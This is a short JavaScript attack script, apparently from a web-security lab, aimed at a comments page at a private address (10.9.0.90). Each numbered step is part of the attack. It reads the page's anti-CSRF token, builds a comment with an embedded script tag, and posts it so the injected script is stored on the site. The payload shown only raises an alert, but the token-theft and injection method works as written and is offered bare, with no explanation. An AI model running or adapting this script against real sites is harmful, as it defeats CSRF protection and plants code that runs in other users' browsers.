// Step 1: Request comments.php to grab CSRF token
var requestToGetCSRFtoken = new XMLHttpRequest();
requestToGetCSRFtoken.open("GET", "http://10.9.0.90/comments.php", false);
requestToGetCSRFtoken.send(null);

var data = requestToGetCSRFtoken.response;

// Step 2: Parse HTML response to extract CSRF token
var parser = new DOMParser();
var resp = parser.parseFromString(data, "text/html");
var CSRFtoken = resp.getElementsByName("token256")[0].value;

// Step 3: Construct malicious comment with proper encoding
var maliciousScript = encodeURIComponent('Hi Iam ada..<script>alert("ALL YOUR SCRIPT ARE BELONG TO US.")</script>');

// Step 4: Build POST parameters
var postParameters = "name=ada&";
postParameters += "comment=" + maliciousScript + "&";
postParameters += "token256=" + CSRFtoken;

// Step 5: Send POST request to submit malicious comment
var postMaliciousScript = new XMLHttpRequest();
postMaliciousScript.open("POST", "http://10.9.0.90/comments.php", false);
postMaliciousScript.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
postMaliciousScript.send(postParameters);

